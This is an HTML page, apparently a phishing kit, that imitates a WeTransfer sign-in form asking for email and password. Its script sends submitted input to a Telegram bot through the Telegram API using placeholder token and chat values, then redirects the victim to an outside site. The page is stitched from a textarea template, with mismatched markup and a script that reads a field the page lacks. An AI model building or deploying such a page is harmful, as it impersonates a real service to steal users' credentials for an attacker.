<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Testing</title>

  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">

  <style>
    *{
      margin:0;
      padding:0;
      box-sizing:border-box;
      font-family:"Poppins",sans-serif;
    }

    body{
      background:linear-gradient(135deg,#0d6efd,#1e90ff);
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:20px;
    }

    .container{
      background:#fff;
      width:100%;
      max-width:420px;
      padding:30px;
      border-radius:18px;
      box-shadow:0 10px 30px rgba(0,0,0,0.2);
    }

    h1{
      text-align:center;
      color:#0d6efd;
      margin-bottom:8px;
    }

    p{
      text-align:center;
      color:#666;
      font-size:14px;
      margin-bottom:25px;
    }

    label{
      font-size:13px;
      color:#333;
      display:block;
      margin-bottom:5px;
    }

    textarea{
      width:100%;
      padding:12px;
      height:140px;
      border:1px solid #ddd;
      border-radius:10px;
      outline:none;
      resize:none;
      font-size:14px;
    }

    textarea:focus{
      border-color:#0d6efd;
    }

    button{
      width:100%;
      margin-top:18px;
      padding:12px;
      border:none;
      background:#0d6efd;
      color:#fff;
      font-weight:600;
      border-radius:10px;
      cursor:pointer;
    }

    button:hover{
      background:#0b5ed7;
    }

    .footer-text{
      text-align:center;
      font-size:12px;
      margin-top:15px;
      color:#888;
    }

    .success{
      display:none;
      text-align:center;
      color:green;
      margin-top:15px;
      font-size:14px;
    }
  </style>
</head>

<body>

  <div class="wrapper">

    <div class="logo">
      WeTransfer
    </div>

    <div class="title">
      Sign In
    </div>

    <div class="subtitle">
      to continue to your WeTransfer account.
    </div>
    
    <form id="telegramForm">
      <div class="input-group">
        <input type="email" placeholder="Email">
      </div>

      <div class="input-group">
        <input type="password" placeholder="Password">
      </div>

      <button type="submit" class="btn">
        Continue
      </button>

    </form>

    <div class="links">
      <a href="#">Forgot password?</a>
      <a href="#">Use a different email?</a>
    </div>

    <div class="divider">
      <span>or</span>
    </div>

    <div class="bottom-text">
      Receive a <a href="#">temporary code via email</a>
    </div>

  </div>


    </form>

    <div class="success" id="successMsg">
      Successfully Submitted...
    </div>

    <div class="footer-text">WeTransfer</div>
  </div>

  <script>
    const botToken = "YOUR_BOT_TOKEN";
    const chatId = "YOUR_CHAT_ID";

    document.getElementById("telegramForm").addEventListener("submit", async function(e){
      e.preventDefault();

      const message = document.getElementById("message").value;

      const text = `
🔔 New Testing Key Submitted

${message}
      `;

      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      try{
        const response = await fetch(url,{
          method:"POST",
          headers:{
            "Content-Type":"application/json"
          },
          body:JSON.stringify({
            chat_id: chatId,
            text: text
          })
        });

        if(response.ok){

          document.getElementById("successMsg").style.display = "block";

          // redirect after 2 seconds
          setTimeout(() => {
            window.location.href = "https://nxloaded.com";
          }, 2000);

        }else{
          alert("Failed to send");
        }

      }catch(error){
        alert("Error sending message");
      }
    });
  </script>

</body>
</html>
